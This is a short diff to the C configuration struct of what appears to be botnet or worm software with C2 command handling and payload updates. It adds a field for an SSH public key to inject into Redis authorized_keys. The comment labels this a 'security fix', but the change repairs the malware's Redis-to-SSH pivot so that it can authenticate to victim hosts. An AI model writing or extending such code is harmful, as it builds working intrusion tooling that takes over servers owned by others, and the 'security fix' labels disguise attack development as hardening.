@@ -140,6 +140,12 @@ typedef struct {
      * environment variable. Empty = fail-closed (update is refused). */
     char payload_sha256[65];
 
+    /* SECURITY FIX (#72): SSH public key injected into Redis
+     * authorized_keys (redis_ssh_key= config or NOTNET_REDIS_SSH_KEY env).
+     * The old code injected a literal placeholder that OpenSSH rejects,
+     * so the Redis -> SSH-22 pivot could never authenticate. */
+    char redis_ssh_key[1024];
+
     /* SECURITY FIX (#14): Rate limiting for C2 commands */
     time_t last_cmd_time;
     int cmd_this_second;
